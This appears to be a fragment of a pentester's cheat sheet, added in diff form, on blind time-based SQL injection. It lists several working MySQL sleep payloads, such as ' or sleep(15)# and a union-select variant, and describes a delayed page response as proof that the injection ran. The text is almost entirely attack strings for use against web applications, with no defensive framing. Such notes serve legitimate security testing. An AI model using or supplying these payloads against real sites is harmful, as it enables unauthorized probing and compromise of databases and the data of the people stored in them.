@@ -1,0 +1,6 @@
+1.it is easier to indicate if there is a delay on the response which would mean your payload was executed blindly. Some common sleep payloads I use:I will use between 15-30 seconds to determine if the page is actually vulnerable)
+' or sleep(15) and 1=1#
+' or sleep(15)#
+' union select sleep(15),null#
+keywordhere' and sleep(15)# (if keywordhere is found then it will delay)
+
